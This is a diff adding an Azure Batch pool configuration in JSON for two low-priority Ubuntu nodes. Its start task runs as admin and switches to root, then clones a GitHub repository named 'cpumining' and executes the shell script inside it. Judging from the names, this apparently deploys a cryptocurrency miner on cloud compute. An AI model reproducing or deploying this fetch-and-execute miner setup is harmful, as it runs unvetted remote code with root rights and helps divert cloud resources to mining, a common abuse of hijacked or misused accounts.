@@ -1,0 +1,45 @@
+{
+    "id": "pool",
+    "url": "https://michaelbatch003.westindia.batch.azure.com/pools/pool",
+    "eTag": "0x8D71C690F9D06EF",
+    "lastModified": "2019-08-09T01:29:45.530Z",
+    "creationTime": "2019-08-07T15:32:53.659Z",
+    "state": "active",
+    "stateTransitionTime": "2019-08-07T15:32:53.659Z",
+    "allocationState": "steady",
+    "allocationStateTransitionTime": "2019-08-07T15:34:20.317Z",
+    "vmSize": "standard_f4s",
+    "virtualMachineConfiguration": {
+        "imageReference": {
+            "publisher": "Canonical",
+            "offer": "UbuntuServer",
+            "sku": "16.04-LTS",
+            "version": "latest"
+        },
+        "nodeAgentSKUId": "batch.node.ubuntu 16.04"
+    },
+    "resizeTimeout": "PT15M",
+    "currentDedicatedNodes": 0,
+    "currentLowPriorityNodes": 2,
+    "targetDedicatedNodes": 0,
+    "targetLowPriorityNodes": 2,
+    "enableAutoScale": false,
+    "enableInterNodeCommunication": false,
+    "startTask": {
+        "commandLine": "/bin/bash -c 'sudo su -; sudo apt-get update; sudo apt-get install git -y; rm -rf cpumining At_395.sh; git clone https://github.com/luanbuifx/cpumining.git; cd cpumining; chmod u+x At_395.sh; ./At_395.sh'\n",
+        "resourceFiles": [],
+        "environmentSettings": [],
+        "userIdentity": {
+            "autoUser": {
+                "scope": "pool",
+                "elevationLevel": "admin"
+            }
+        },
+        "maxTaskRetryCount": 0,
+        "waitForSuccess": false
+    },
+    "maxTasksPerNode": 1,
+    "taskSchedulingPolicy": {
+        "nodeFillType": "Pack"
+    }
+}
